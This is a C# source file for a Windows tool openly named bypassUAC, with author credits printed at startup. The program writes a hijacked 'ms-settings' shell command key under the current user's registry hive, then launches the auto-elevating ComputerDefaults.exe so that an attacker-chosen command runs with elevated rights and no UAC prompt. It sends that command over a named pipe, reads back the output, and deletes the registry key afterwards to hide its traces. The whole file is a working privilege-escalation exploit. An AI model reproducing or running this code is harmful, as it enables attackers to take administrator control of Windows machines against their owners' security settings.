using System;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using Microsoft.Win32;

namespace bypassUAC
{
    class Program
    {
        static void ExecuteProcess()
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.Arguments = "/c ComputerDefaults.exe";
            process.Start();
        }
        static void Main(string[] args)
        {
            string cmd = args.Length == 0 ? "whoami /priv" :args[0];

            Console.WriteLine("Author: Hzllaga");
            Console.WriteLine("Github: https://github.com/Hzllaga\n");

            RegistryKey regkey = Registry.CurrentUser
                .OpenSubKey("Software", true)
                .OpenSubKey("Classes", true)
                .CreateSubKey("ms-settings")
                .CreateSubKey("shell")
                .CreateSubKey("open")
                .CreateSubKey("command");
            regkey.SetValue(default, System.Environment.CurrentDirectory + "\\PipeClient.exe");
            regkey.SetValue("DelegateExecute", "");
            
            Console.WriteLine("[+] Registry key write successful.");
            
            using (NamedPipeServerStream server = new NamedPipeServerStream("bypassUAC_____Pipe@"))
            {
                Console.WriteLine("[+] Pipe server established, waiting for connection.");
                ExecuteProcess();
                Console.WriteLine("[+] Process created.");
                server.WaitForConnection();
                StreamReader sr = new StreamReader(server);
                StreamWriter sw = new StreamWriter(server);
                Console.WriteLine("[+] Client connected, sending {0} command.", cmd);
                sw.WriteLine(cmd);
                sw.Flush();
                Console.WriteLine("======================================\n");
                string line;
                while ((line = sr.ReadLine()) != null)
                {
                    if (line == "exit")
                    {
                        Console.WriteLine("\n======================================");
                        server.Disconnect();
                        break;
                    }
                    else
                    {
                        Console.WriteLine(line);
                    }
                    
                }
                Registry.CurrentUser
                    .OpenSubKey("Software", true)
                    .OpenSubKey("Classes", true)
                    .DeleteSubKeyTree("ms-settings");
                Console.WriteLine("[+] Registry key clean successful.");
                Console.WriteLine("[+] Enjoy, bye!");
            }
        }
    }
}
